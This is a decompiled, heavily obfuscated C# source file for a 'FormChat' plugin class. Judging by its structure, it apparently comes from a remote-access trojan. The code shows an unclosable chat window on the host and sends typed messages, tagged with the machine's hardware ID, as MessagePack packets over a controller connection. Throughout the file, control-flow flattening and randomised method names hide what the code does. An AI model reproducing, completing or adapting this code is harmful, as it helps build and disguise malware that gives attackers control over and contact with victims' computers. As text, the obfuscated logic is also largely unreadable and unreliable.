using System;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using HsZcU78F13T1yLWI1V;
using MessagePackLib.MessagePack;
using UY3BiEArlp6B4GPt9k;

namespace Plugin;

public class FormChat : Form
{
	[Serializable]
	[CompilerGenerated]
	private sealed class _003C_003Ec
	{
		public static readonly _003C_003Ec _003C_003E9;

		public static MethodInvoker _003C_003E9__3_0;

		private static _003C_003Ec hHbEAEu1RPhcuxiSCwY;

		[MethodImpl(MethodImplOptions.NoInlining)]
		static _003C_003Ec()
		{
			int num = 2;
			while (true)
			{
				int num2 = num;
				do
				{
					IL_0012:
					switch (num2)
					{
					default:
						return;
					case 2:
						break;
					case 1:
						_003C_003E9 = new _003C_003Ec();
						num2 = 0;
						if (true)
						{
							num2 = 0;
						}
						goto IL_0012;
					case 0:
						return;
					}
					UnawDgup8JGcKIdfuN7();
					num2 = 1;
				}
				while (0 == 0);
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public _003C_003Ec()
		{
			UnawDgup8JGcKIdfuN7();
			base._002Ector();
			int num = 0;
			if (false)
			{
				int num2;
				num = num2;
			}
			switch (num)
			{
			case 0:
				break;
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		internal void _003CTimer1_Tick_003Eb__3_0()
		{
			int num = 2;
			while (true)
			{
				int num2 = num;
				while (true)
				{
					switch (num2)
					{
					default:
						return;
					case 1:
					case 3:
					{
						FormChat getFormChat2 = Packet.GetFormChat;
						if (getFormChat2 == null)
						{
							num2 = 0;
							if (HBF8h6uIfXMxkRBje4J())
							{
								continue;
							}
							break;
						}
						AMSP6nuVvxJND36fNCK(getFormChat2, rw5tcZVJaEkNI8B1Xd.JGqO3HKook);
						num2 = 4;
						continue;
					}
					case 4:
						return;
					case 2:
					{
						FormChat getFormChat = Packet.GetFormChat;
						if (getFormChat == null)
						{
							num2 = 1;
							if (Yg7motuC57qTvxutCuv() == null)
							{
								continue;
							}
							break;
						}
						rw5tcZVJaEkNI8B1Xd.UXKaDWyvn(getFormChat, rw5tcZVJaEkNI8B1Xd.IBxOyedeqg);
						num2 = 3;
						if (Yg7motuC57qTvxutCuv() == null)
						{
							continue;
						}
						break;
					}
					case 0:
						return;
					}
					break;
				}
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		internal static void UnawDgup8JGcKIdfuN7()
		{
			WkMgYHbfSUMGdoITRx.UaxVEsuzWFTQk();
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		internal static bool HBF8h6uIfXMxkRBje4J()
		{
			return hHbEAEu1RPhcuxiSCwY == null;
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		internal static _003C_003Ec Yg7motuC57qTvxutCuv()
		{
			return hHbEAEu1RPhcuxiSCwY;
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		internal static void AMSP6nuVvxJND36fNCK(object P_0, object P_1)
		{
			rw5tcZVJaEkNI8B1Xd.UXKaDWyvn(P_0, (rw5tcZVJaEkNI8B1Xd)P_1);
		}
	}

	private IContainer components;

	private TextBox textBox1;

	public RichTextBox richTextBox1;

	private Timer timer1;

	private static FormChat SdFodmy0U0SWfn9a7M;

	[MethodImpl(MethodImplOptions.NoInlining)]
	public FormChat()
	{
		VURfJreGeoKcw8lqKM();
		base._002Ector();
		int num = 0;
		if (false)
		{
			goto IL_0026;
		}
		goto IL_002a;
		IL_0026:
		int num2;
		num = num2;
		goto IL_002a;
		IL_002a:
		do
		{
			switch (num)
			{
			case 1:
				return;
			}
			InitializeComponent();
			num = 1;
		}
		while (0 == 0);
		goto IL_0026;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void TextBox1_KeyDown(object sender, KeyEventArgs e)
	{
		int num = 4;
		while (true)
		{
			int num2 = num;
			do
			{
				IL_0012:
				switch (num2)
				{
				default:
					return;
				case 2:
				{
					MsgPack msgPack = new MsgPack();
					dqUydBlUYuY0gnGKAg(K6cB6fwtUfIWl1dBTj(msgPack, nCP5vtxT3QjsSeuiK3.xuCtsHmOK(0)), J35Jt6XOsmQkvvgXht(44));
					((MsgPack)K6cB6fwtUfIWl1dBTj(msgPack, J35Jt6XOsmQkvvgXht(56))).AsString = (string)JncKAXMDMnCicPYIIA();
					dqUydBlUYuY0gnGKAg(K6cB6fwtUfIWl1dBTj(msgPack, J35Jt6XOsmQkvvgXht(68)), Htsh6HasmQAQonMPfQ8.UXKaDWyvn(hJe81sCrvW4Y1rxDhT.UXKaDWyvn(hJe81sCrvW4Y1rxDhT.RxSaOl76Uv), (string)J35Jt6XOsmQkvvgXht(92), vurjld4dlsqMOeBujC.UXKaDWyvn(textBox1, vurjld4dlsqMOeBujC.DvAnRGNrd), hJe81sCrvW4Y1rxDhT.UXKaDWyvn(hJe81sCrvW4Y1rxDhT.baXeJhK0u), Htsh6HasmQAQonMPfQ8.z5CaHAMHDt));
					wJixJ3rha1CiE03ggF(msgPack.Encode2Bytes());
					num2 = 5;
					break;
				}
				case 3:
					if (Xt6765W5CEoHqyLw1g(vurjld4dlsqMOeBujC.UXKaDWyvn(textBox1, vurjld4dlsqMOeBujC.DvAnRGNrd), No35vjJ62okI15s0oO.Vh2P9FmQ3))
					{
						goto IL_00f6;
					}
					goto case 1;
				case 1:
					zbF6tSHcEBnhiaBjfc(richTextBox1, GFCeVIvbXTRkoWxHrF(nCP5vtxT3QjsSeuiK3.xuCtsHmOK(32), sGF3Zh5a9i4YeRaWA2(textBox1, vurjld4dlsqMOeBujC.DvAnRGNrd), hJe81sCrvW4Y1rxDhT.UXKaDWyvn(hJe81sCrvW4Y1rxDhT.baXeJhK0u), dFkWIOz0l1iVNeGcUd.Y2va5rdRMe), blSqWmaaXWKdMLFSFIC.XvpambRlSo);
					num2 = 2;
					break;
				case 0:
					return;
				case 6:
					return;
				case 5:
					wHf9QmzTgZL08TTWX8(textBox1, rw5tcZVJaEkNI8B1Xd.zRjaZcUfQ8);
					num2 = 6;
					break;
				case 4:
					if (IlF0y537Q04usvZAQy(e, kQc2ONIZwt9ohAi9KQ.EgBFl7Awb) != Keys.Return)
					{
						return;
					}
					num2 = 3;
					if (!rNtyfsPay5BubGjjFb())
					{
						num2 = 3;
					}
					break;
				}
				goto IL_0012;
				IL_00f6:
				num2 = 0;
			}
			while (rNtyfsPay5BubGjjFb());
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void FormChat_FormClosing(object sender, FormClosingEventArgs e)
	{
		int num = 1;
		int num2 = num;
		while (true)
		{
			switch (num2)
			{
			default:
				return;
			case 0:
				return;
			case 1:
				IA6D4QNJqgA5OEQ2ofE(e, true, Fhl3sPa4fO5Wo8nUn4N.GgNaAhFCoJ);
				num2 = 0;
				if (xBc5W5htJRks5WEbFD() == null)
				{
					num2 = 0;
				}
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void Timer1_Tick(object sender, EventArgs e)
	{
		int num = 3;
		while (true)
		{
			int num2 = num;
			while (true)
			{
				switch (num2)
				{
				case 3:
					if (!Connection.IsConnected)
					{
						num2 = 0;
						if (rNtyfsPay5BubGjjFb())
						{
							num2 = 2;
						}
						continue;
					}
					return;
				default:
					hMSMu4NZY4xHuuGQPCB(bBmXb7EBty0gQq3Dng.ErVUGTT2i);
					num2 = 1;
					if (!rNtyfsPay5BubGjjFb())
					{
						num2 = 1;
					}
					continue;
				case 1:
					return;
				case 4:
					Connection.Disconnected();
					num2 = 0;
					if (rNtyfsPay5BubGjjFb())
					{
						continue;
					}
					break;
				case 2:
					Shc2hrNNxdb4coQN3WP(Packet.GetFormChat, (MethodInvoker)([MethodImpl(MethodImplOptions.NoInlining)] () =>
					{
						int num3 = 2;
						while (true)
						{
							int num4 = num3;
							while (true)
							{
								switch (num4)
								{
								default:
									return;
								case 1:
								case 3:
								{
									FormChat getFormChat2 = Packet.GetFormChat;
									if (getFormChat2 != null)
									{
										_003C_003Ec.AMSP6nuVvxJND36fNCK(getFormChat2, rw5tcZVJaEkNI8B1Xd.JGqO3HKook);
										num4 = 4;
										continue;
									}
									num4 = 0;
									if (_003C_003Ec.HBF8h6uIfXMxkRBje4J())
									{
										continue;
									}
									break;
								}
								case 4:
									return;
								case 2:
								{
									FormChat getFormChat = Packet.GetFormChat;
									if (getFormChat == null)
									{
										num4 = 1;
										if (_003C_003Ec.Yg7motuC57qTvxutCuv() == null)
										{
											continue;
										}
									}
									else
									{
										rw5tcZVJaEkNI8B1Xd.UXKaDWyvn(getFormChat, rw5tcZVJaEkNI8B1Xd.IBxOyedeqg);
										num4 = 3;
										if (_003C_003Ec.Yg7motuC57qTvxutCuv() == null)
										{
											continue;
										}
									}
									break;
								}
								case 0:
									return;
								}
								break;
							}
						}
					}));
					num2 = 4;
					if (rNtyfsPay5BubGjjFb())
					{
						continue;
					}
					break;
				}
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	protected override void Dispose(bool disposing)
	{
		int num = 4;
		while (true)
		{
			int num2 = num;
			while (true)
			{
				switch (num2)
				{
				default:
					IA6D4QNJqgA5OEQ2ofE(this, disposing, Fhl3sPa4fO5Wo8nUn4N.n0tayRhLwO);
					num2 = 1;
					if (rNtyfsPay5BubGjjFb())
					{
						num2 = 1;
					}
					continue;
				case 3:
					if (components != null)
					{
						num = 2;
						break;
					}
					goto default;
				case 4:
					if (disposing)
					{
						num2 = 3;
						continue;
					}
					goto default;
				case 1:
					return;
				case 2:
					wHf9QmzTgZL08TTWX8(components, rw5tcZVJaEkNI8B1Xd.tCpxoHWdj);
					num2 = 0;
					if (rNtyfsPay5BubGjjFb())
					{
						continue;
					}
					break;
				}
				break;
			}
		}
	}

	[System.Runtime.CompilerServices.MethodImpl(System.Runtime.CompilerServices.MethodImplOptions.NoInlining)]
	private void InitializeComponent()
	{
		int num = 39;
		while (true)
		{
			int num2 = num;
			while (true)
			{
				switch (num2)
				{
				case 39:
					this.components = new System.ComponentModel.Container();
					num2 = 38;
					continue;
				case 21:
					Plugin.FormChat.zbF6tSHcEBnhiaBjfc(this.richTextBox1, "", blSqWmaaXWKdMLFSFIC.SLVauIalGs);
					num2 = 12;
					continue;
				case 9:
					Plugin.FormChat.JHGtL9N8v2f8eHj4Fdg(this.textBox1, new System.Windows.Forms.KeyEventHandler(TextBox1_KeyDown), p1ddpaakbEtxHFUKXqK.DDFa0eLUfF);
					num2 = 24;
					continue;
				case 37:
					Plugin.FormChat.IA6D4QNJqgA5OEQ2ofE(this, false, Fhl3sPa4fO5Wo8nUn4N.qQbaYp2Aim);
					num2 = 36;
					continue;
				case 25:
					Plugin.FormChat.GrLVSlN6kww8L6fe78E(this, new System.Drawing.SizeF(9f, 20f), thTEiFaNNrAUANPKkgI.bkKavabTLe);
					num2 = 30;
					continue;
				case 28:
					Plugin.FormChat.zbF6tSHcEBnhiaBjfc(this.textBox1, UY3BiEArlp6B4GPt9k.nCP5vtxT3QjsSeuiK3.xuCtsHmOK(100), blSqWmaaXWKdMLFSFIC.RMuaXClO2h);
					num2 = 1;
					if (Plugin.FormChat.xBc5W5htJRks5WEbFD() == null)
					{
						continue;
					}
					break;
				case 12:
					Plugin.FormChat.IA6D4QNJqgA5OEQ2ofE(this.timer1, true, Fhl3sPa4fO5Wo8nUn4N.BhWajhGuMt);
					num2 = 23;
					continue;
				case 14:
					wTVjora2680Ogx2pW5f.UXKaDWyvn(this.textBox1, System.Windows.Forms.DockStyle.Bottom, wTVjora2680Ogx2pW5f.oxUapMIDQc);
					num2 = 27;
					continue;
				case 13:
					Plugin.FormChat.IG9ZBXNYKuhrLEtaoas(this, new System.Windows.Forms.FormClosingEventHandler(FormChat_FormClosing), NBtRe2axVPaCGAt2lPv.CFLact8m14);
					num2 = 37;
					if (Plugin.FormChat.rNtyfsPay5BubGjjFb())
					{
						continue;
					}
					break;
				case 26:
					Plugin.FormChat.M15iSrN9CFkhJFIFvr7(this.richTextBox1, Plugin.FormChat.EyXMIKNK95HaBSRWdHi(TYtuhFaVa7yBgJ1dhPB.YB9aquXEWZ), UriyeKadV67miHNbuwD.btaalZSNit);
					num2 = 35;
					continue;
				case 10:
					Plugin.FormChat.IA6D4QNJqgA5OEQ2ofE(this, false, Fhl3sPa4fO5Wo8nUn4N.HHmaBemDaX);
					num2 = 11;
					continue;
				case 29:
					Plugin.FormChat.zbF6tSHcEBnhiaBjfc(this, Plugin.FormChat.J35Jt6XOsmQkvvgXht(148), blSqWmaaXWKdMLFSFIC.EdJa9C2pkF);
					num2 = 10;
					if (!Plugin.FormChat.rNtyfsPay5BubGjjFb())
					{
						num2 = 6;
					}
					continue;
				case 34:
					Plugin.FormChat.zbF6tSHcEBnhiaBjfc(this, Plugin.FormChat.J35Jt6XOsmQkvvgXht(168), blSqWmaaXWKdMLFSFIC.SLVauIalGs);
					num2 = 6;
					continue;
				case 4:
					Plugin.FormChat.aiAchtNqiRYC9lDRUJv(this.textBox1, 3, gfWIxpmLLwXs9yNk8c.KDXaMgJ9yn);
					num2 = 9;
					continue;
				case 19:
					DI79UFaKItmDYRBVjHX.UXKaDWyvn(this.richTextBox1, new System.Drawing.Size(733, 351), DI79UFaKItmDYRBVjHX.e59aiymTrb);
					num2 = 7;
					if (Plugin.FormChat.xBc5W5htJRks5WEbFD() != null)
					{
						num2 = 0;
					}
					continue;
				case 23:
					Plugin.FormChat.aiAchtNqiRYC9lDRUJv(this.timer1, 1000, gfWIxpmLLwXs9yNk8c.ktMaTjjsgc);
					num2 = 2;
					continue;
				case 32:
					return;
				case 5:
					this.timer1 = new System.Windows.Forms.Timer(this.components);
					num2 = 31;
					if (!Plugin.FormChat.rNtyfsPay5BubGjjFb())
					{
						num2 = 5;
					}
					continue;
				case 38:
					this.textBox1 = new System.Windows.Forms.TextBox();
					num2 = 18;
					continue;
				case 16:
					Plugin.FormChat.IA6D4QNJqgA5OEQ2ofE(this, false, Fhl3sPa4fO5Wo8nUn4N.kgnah0gs5q);
					num2 = 17;
					continue;
				case 17:
					tcbunuaoUD0Iv4W6w4f.UXKaDWyvn(base.Controls, this.textBox1, tcbunuaoUD0Iv4W6w4f.n39agaZVrU);
					num2 = 22;
					continue;
				case 15:
					Plugin.FormChat.zbF6tSHcEBnhiaBjfc(this.richTextBox1, UY3BiEArlp6B4GPt9k.nCP5vtxT3QjsSeuiK3.xuCtsHmOK(120), blSqWmaaXWKdMLFSFIC.RMuaXClO2h);
					num2 = 0;
					if (!Plugin.FormChat.rNtyfsPay5BubGjjFb())
					{
						num2 = 0;
					}
					continue;
				case 6:
					Plugin.FormChat.IA6D4QNJqgA5OEQ2ofE(this, true, Fhl3sPa4fO5Wo8nUn4N.L8gaRr25j4);
					num = 13;
					break;
				case 8:
					Plugin.FormChat.AJwffoNRLY0Uix4QYU9(this.richTextBox1, new System.Drawing.Point(12, 12), xI2kULaQG6UTAVj7ehw.vCTa1dQ9l5);
					num2 = 15;
					if (Plugin.FormChat.rNtyfsPay5BubGjjFb())
					{
						continue;
					}
					break;
				case 27:
					xI2kULaQG6UTAVj7ehw.UXKaDWyvn(this.textBox1, new System.Drawing.Point(0, 384), xI2kULaQG6UTAVj7ehw.vCTa1dQ9l5);
					num2 = 28;
					continue;
				case 30:
					Plugin.FormChat.fjGnYhNbYr1QSNN5FCe(this, System.Windows.Forms.AutoScaleMode.Font, nRbI0eaWrkwuWixqMco.Tg4a6v18GU);
					num2 = 3;
					if (Plugin.FormChat.xBc5W5htJRks5WEbFD() == null)
					{
						continue;
					}
					break;
				case 3:
					UriyeKadV67miHNbuwD.UXKaDWyvn(this, Plugin.FormChat.EyXMIKNK95HaBSRWdHi(TYtuhFaVa7yBgJ1dhPB.YB9aquXEWZ), UriyeKadV67miHNbuwD.btaalZSNit);
					num2 = 16;
					if (Plugin.FormChat.xBc5W5htJRks5WEbFD() == null)
					{
						num2 = 33;
					}
					continue;
				case 22:
					tcbunuaoUD0Iv4W6w4f.UXKaDWyvn(base.Controls, this.richTextBox1, tcbunuaoUD0Iv4W6w4f.n39agaZVrU);
					num = 29;
					break;
				case 20:
					Plugin.FormChat.pLdmd7NshYfcCeWxIVy(this, System.Windows.Forms.FormStartPosition.CenterScreen, qPPArZaSp0NswdOR1gP.erXaGJTuQ2);
					num2 = 34;
					continue;
				case 18:
					this.richTextBox1 = new System.Windows.Forms.RichTextBox();
					num2 = 5;
					if (Plugin.FormChat.xBc5W5htJRks5WEbFD() != null)
					{
						num2 = 3;
					}
					continue;
				case 35:
					Plugin.FormChat.ffxGNNN7Q8oYwedUNLM(this.richTextBox1, System.Windows.Forms.BorderStyle.None, WZBt1NafbhsHviaS3vL.SHNab5BYc0);
					num = 8;
					break;
				case 11:
					Plugin.FormChat.IA6D4QNJqgA5OEQ2ofE(this, false, Fhl3sPa4fO5Wo8nUn4N.PpZaDVRl1J);
					num = 20;
					break;
				case 24:
					Plugin.FormChat.lFffPHNTfdKJ0OapneW(this.richTextBox1, System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right, aP7PhCa80fuKbiCLVqD.lKWatNl0RO);
					num2 = 26;
					if (Plugin.FormChat.rNtyfsPay5BubGjjFb())
					{
						continue;
					}
					break;
				case 7:
					gfWIxpmLLwXs9yNk8c.UXKaDWyvn(this.richTextBox1, 2, gfWIxpmLLwXs9yNk8c.KDXaMgJ9yn);
					num2 = 21;
					if (Plugin.FormChat.xBc5W5htJRks5WEbFD() == null)
					{
						continue;
					}
					break;
				case 2:
					Plugin.FormChat.LMD4tINoeopLfbJb4ZZ(this.timer1, new System.EventHandler(Timer1_Tick), AiBxsfa7sHYm4yZQTR3.hhJarjaT9d);
					num2 = 25;
					if (Plugin.FormChat.xBc5W5htJRks5WEbFD() == null)
					{
						continue;
					}
					break;
				case 31:
					Plugin.FormChat.wHf9QmzTgZL08TTWX8(this, rw5tcZVJaEkNI8B1Xd.Nsua35mt6E);
					num2 = 14;
					continue;
				default:
					Fhl3sPa4fO5Wo8nUn4N.UXKaDWyvn(this.richTextBox1, true, Fhl3sPa4fO5Wo8nUn4N.Pgtawa2Jwu);
					num2 = 19;
					continue;
				case 33:
					DI79UFaKItmDYRBVjHX.UXKaDWyvn(this, new System.Drawing.Size(757, 410), DI79UFaKItmDYRBVjHX.pA7aLlkGCa);
					num2 = 16;
					continue;
				case 1:
					Plugin.FormChat.reS6DENutFdW132utB7(this.textBox1, new System.Drawing.Size(757, 26), DI79UFaKItmDYRBVjHX.e59aiymTrb);
					num2 = 4;
					if (Plugin.FormChat.xBc5W5htJRks5WEbFD() != null)
					{
						num2 = 3;
					}
					continue;
				case 36:
					rw5tcZVJaEkNI8B1Xd.UXKaDWyvn(this, rw5tcZVJaEkNI8B1Xd.PxVaEvIqaw);
					num2 = 32;
					continue;
				}
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void VURfJreGeoKcw8lqKM()
	{
		WkMgYHbfSUMGdoITRx.UaxVEsuzWFTQk();
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool rNtyfsPay5BubGjjFb()
	{
		return SdFodmy0U0SWfn9a7M == null;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static FormChat xBc5W5htJRks5WEbFD()
	{
		return SdFodmy0U0SWfn9a7M;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static Keys IlF0y537Q04usvZAQy(object P_0, object P_1)
	{
		return kQc2ONIZwt9ohAi9KQ.UXKaDWyvn(P_0, (kQc2ONIZwt9ohAi9KQ)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool Xt6765W5CEoHqyLw1g(object P_0, object P_1)
	{
		return No35vjJ62okI15s0oO.UXKaDWyvn((string)P_0, (No35vjJ62okI15s0oO)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object sGF3Zh5a9i4YeRaWA2(object P_0, object P_1)
	{
		return vurjld4dlsqMOeBujC.UXKaDWyvn(P_0, (vurjld4dlsqMOeBujC)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object GFCeVIvbXTRkoWxHrF(object P_0, object P_1, object P_2, object P_3)
	{
		return dFkWIOz0l1iVNeGcUd.UXKaDWyvn((string)P_0, (string)P_1, (string)P_2, (dFkWIOz0l1iVNeGcUd)P_3);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void zbF6tSHcEBnhiaBjfc(object P_0, object P_1, object P_2)
	{
		blSqWmaaXWKdMLFSFIC.UXKaDWyvn(P_0, (string)P_1, (blSqWmaaXWKdMLFSFIC)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object K6cB6fwtUfIWl1dBTj(object P_0, object P_1)
	{
		return ((MsgPack)P_0).ForcePathObject((string)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object J35Jt6XOsmQkvvgXht(int P_0)
	{
		return nCP5vtxT3QjsSeuiK3.xuCtsHmOK(P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void dqUydBlUYuY0gnGKAg(object P_0, object P_1)
	{
		((MsgPack)P_0).AsString = (string)P_1;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object JncKAXMDMnCicPYIIA()
	{
		return Connection.Hwid;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void wJixJ3rha1CiE03ggF(object P_0)
	{
		Connection.Send((byte[])P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void wHf9QmzTgZL08TTWX8(object P_0, object P_1)
	{
		rw5tcZVJaEkNI8B1Xd.UXKaDWyvn(P_0, (rw5tcZVJaEkNI8B1Xd)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void IA6D4QNJqgA5OEQ2ofE(object P_0, bool P_1, object P_2)
	{
		Fhl3sPa4fO5Wo8nUn4N.UXKaDWyvn(P_0, P_1, (Fhl3sPa4fO5Wo8nUn4N)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object Shc2hrNNxdb4coQN3WP(object P_0, object P_1)
	{
		return ((Control)P_0).Invoke((Delegate)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void hMSMu4NZY4xHuuGQPCB(object P_0)
	{
		bBmXb7EBty0gQq3Dng.UXKaDWyvn((bBmXb7EBty0gQq3Dng)P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void reS6DENutFdW132utB7(object P_0, Size P_1, object P_2)
	{
		DI79UFaKItmDYRBVjHX.UXKaDWyvn(P_0, P_1, (DI79UFaKItmDYRBVjHX)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void aiAchtNqiRYC9lDRUJv(object P_0, int P_1, object P_2)
	{
		gfWIxpmLLwXs9yNk8c.UXKaDWyvn(P_0, P_1, (gfWIxpmLLwXs9yNk8c)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void JHGtL9N8v2f8eHj4Fdg(object P_0, object P_1, object P_2)
	{
		p1ddpaakbEtxHFUKXqK.UXKaDWyvn(P_0, (KeyEventHandler)P_1, (p1ddpaakbEtxHFUKXqK)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void lFffPHNTfdKJ0OapneW(object P_0, AnchorStyles P_1, object P_2)
	{
		aP7PhCa80fuKbiCLVqD.UXKaDWyvn(P_0, P_1, (aP7PhCa80fuKbiCLVqD)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static Color EyXMIKNK95HaBSRWdHi(object P_0)
	{
		return TYtuhFaVa7yBgJ1dhPB.UXKaDWyvn((TYtuhFaVa7yBgJ1dhPB)P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void M15iSrN9CFkhJFIFvr7(object P_0, Color P_1, object P_2)
	{
		UriyeKadV67miHNbuwD.UXKaDWyvn(P_0, P_1, (UriyeKadV67miHNbuwD)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void ffxGNNN7Q8oYwedUNLM(object P_0, BorderStyle P_1, object P_2)
	{
		WZBt1NafbhsHviaS3vL.UXKaDWyvn(P_0, P_1, (WZBt1NafbhsHviaS3vL)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void AJwffoNRLY0Uix4QYU9(object P_0, Point P_1, object P_2)
	{
		xI2kULaQG6UTAVj7ehw.UXKaDWyvn(P_0, P_1, (xI2kULaQG6UTAVj7ehw)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void LMD4tINoeopLfbJb4ZZ(object P_0, object P_1, object P_2)
	{
		AiBxsfa7sHYm4yZQTR3.UXKaDWyvn(P_0, (EventHandler)P_1, (AiBxsfa7sHYm4yZQTR3)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void GrLVSlN6kww8L6fe78E(object P_0, SizeF P_1, object P_2)
	{
		thTEiFaNNrAUANPKkgI.UXKaDWyvn(P_0, P_1, (thTEiFaNNrAUANPKkgI)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void fjGnYhNbYr1QSNN5FCe(object P_0, AutoScaleMode P_1, object P_2)
	{
		nRbI0eaWrkwuWixqMco.UXKaDWyvn(P_0, P_1, (nRbI0eaWrkwuWixqMco)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void pLdmd7NshYfcCeWxIVy(object P_0, FormStartPosition P_1, object P_2)
	{
		qPPArZaSp0NswdOR1gP.UXKaDWyvn(P_0, P_1, (qPPArZaSp0NswdOR1gP)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void IG9ZBXNYKuhrLEtaoas(object P_0, object P_1, object P_2)
	{
		NBtRe2axVPaCGAt2lPv.UXKaDWyvn(P_0, (FormClosingEventHandler)P_1, (NBtRe2axVPaCGAt2lPv)P_2);
	}
}
